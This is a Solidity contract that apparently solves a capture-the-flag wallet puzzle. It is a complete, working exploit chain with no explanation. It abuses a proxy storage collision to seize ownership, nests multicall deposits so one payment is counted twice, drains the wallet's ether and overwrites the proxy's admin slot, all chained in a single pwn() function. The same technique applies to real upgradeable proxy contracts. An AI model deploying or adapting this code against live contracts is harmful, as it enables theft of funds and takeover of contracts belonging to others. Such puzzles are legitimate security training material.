// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface PuzzleProxy {
    function proposeNewAdmin(address) external ;
}

interface PuzzleWallet {
    function setMaxBalance(uint256) external;
    function addToWhitelist(address) external;
    function deposit() external payable;
    function execute(address, uint256, bytes calldata) external payable;
    function multicall(bytes[] calldata) external payable ;
}

contract Stack {
    receive() external payable {}

    function getWalletOwner(address target) public {
        PuzzleProxy(target).proposeNewAdmin(address(this));
    }

    function getWalletWhitelist(address target) public {
        PuzzleWallet(target).addToWhitelist(address(this));
    }

    function stackDeposits(address target) public payable {
        // wrap the deposit calls
        bytes memory depositData = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        bytes[] memory insideMulticallData = new bytes[](1);
        bytes[] memory outsideMulticallData = new bytes[](2);
        insideMulticallData[0] = depositData;
        outsideMulticallData[0] = depositData;
        outsideMulticallData[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, insideMulticallData);
        // deposit
        PuzzleWallet(target).multicall{value: msg.value}(outsideMulticallData);
    }

    function drainWalletBalance(address target) public {
        // withdraw
        PuzzleWallet(target).execute(address(this), 0.002 ether, "");
    }

    function getProxyAdmin(address target, address player) public {
        PuzzleWallet(target).setMaxBalance(uint256(uint160(player)));
    }

    function pwn(address target) public {
        getWalletOwner(target);
        getWalletWhitelist(target);
        stackDeposits(target);
        drainWalletBalance(target);
        getProxyAdmin(target, msg.sender);
    }
}
